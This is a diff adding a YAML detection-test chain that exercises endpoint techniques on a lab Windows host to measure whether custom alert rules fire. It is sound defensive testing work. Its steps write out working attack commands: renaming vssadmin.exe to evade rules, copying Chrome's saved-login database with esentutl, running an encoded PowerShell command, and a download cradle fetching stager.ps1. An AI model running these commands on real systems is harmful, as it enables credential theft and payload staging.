@@ -1,0 +1,90 @@
+# ============================================================
+#  Chain C — techniques the endpoint can exercise unattended
+#
+#  Chain A measured six techniques. The rules cover thirty-three,
+#  so most of the ruleset had never been put in front of the
+#  engine. This chain starts closing that gap with the techniques
+#  Atomic Red Team can run on win-ep without the attacker host
+#  and without internet access.
+#
+#  Scoring contract is the same as Chain A; see that file.
+# ============================================================
+
+chain:
+  id: endpoint-evasion
+  name: Endpoint evasion and discovery — unattended
+  description: >
+    Techniques whose custom rules exist but had never been measured.
+  target:
+    host: win-ep
+    agent_id: "001"
+    agent_ip: 10.10.10.20
+  defaults:
+    window_s: 240
+    settle_s: 180
+
+  limitations:
+    - >
+      Atomic test T1036.003-7 copies cmd.exe rather than a recovery
+      binary, so it exercises the technique but not rule 100416, which
+      keys on the recovery utilities specifically. The step below uses
+      a custom command for that reason: the point is to measure the
+      rule that exists, not the test that is nearest to it.
+    - >
+      T1036.003-6 is excluded: its prerequisite downloads a binary from
+      GitHub, and win-ep has no internet by design. A prerequisite that
+      cannot be met is a setup failure, not a detection failure.
+    - >
+      The custom command leaves C:\Temp\svc.exe behind. Atomic cleanup
+      does not apply to custom steps, so it is removed by hand after
+      the run.
+    - >
+      C2 uses a custom command rather than an Atomic test because rule
+      100313 keys on the browser credential store appearing in a command
+      line. The Chrome Login Data file on win-ep is a real 40 KB profile
+      database, so the copy is a genuine credential-store read and not a
+      command line written to satisfy the rule.
+    - >
+      T1055.001 was dropped from this chain: it has no rule at all, so a
+      BLIND grade would restate a known absence rather than measure
+      anything. T1112 was dropped too — its only rule (100390) is a
+      suppression rule whose success is the absence of an alert, which
+      the four-grade scale cannot express.
+    - >
+      C4 points its download cradle at a LAN address that serves nothing,
+      so the transfer always fails. Rule 100102 keys on the cradle text in
+      the script block, not on a completed download, so the attempt is the
+      detectable event — which is also the honest behaviour: an analyst
+      wants to know a host tried to stage a payload whether or not it
+      succeeded. win-ep has no internet by design, so a real fetch was
+      never an option.
+
+steps:
+  - id: C1
+    name: Recovery binary renamed to evade command-line rules
+    custom_command: 'cmd.exe /c copy C:\Windows\System32\vssadmin.exe C:\Temp\svc.exe >nul && C:\Temp\svc.exe /?'
+    atomic: T1036.003
+    expect_mitre: [T1036.003]
+    expect_rules: [100416]
+
+  - id: C2
+    name: Browser credential store copied with esentutl (LOLBAS)
+    custom_command: 'cmd.exe /c del /q C:\Temp\ld.db 2>nul & esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d C:\Temp\ld.db /o'
+    cleanup_command: 'cmd.exe /c del /q C:\Temp\ld.db'
+    atomic: T1555.003
+    expect_mitre: [T1555.003]
+    expect_rules: [100313]
+
+  - id: C3
+    name: PowerShell -EncodedCommand (Base64 obfuscation)
+    custom_command: 'cmd.exe /c powershell.exe -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAGUAbgBjAG8AZABlAGQAIABwAGEAeQBsAG8AYQBkACAAZQB4AGUAYwB1AHQAZQBkACIAOwAgAHcAaABvAGEAbQBpAA=='
+    atomic: T1027
+    expect_mitre: [T1027, T1059.001]
+    expect_rules: [100100]
+
+  - id: C4
+    name: PowerShell download cradle (Net.WebClient)
+    custom_command: 'cmd.exe /c powershell.exe -Command "(New-Object Net.WebClient).DownloadString(''http://10.10.10.1:8099/stager.ps1'')"'
+    atomic: T1105
+    expect_mitre: [T1105, T1059.001]
+    expect_rules: [100102]
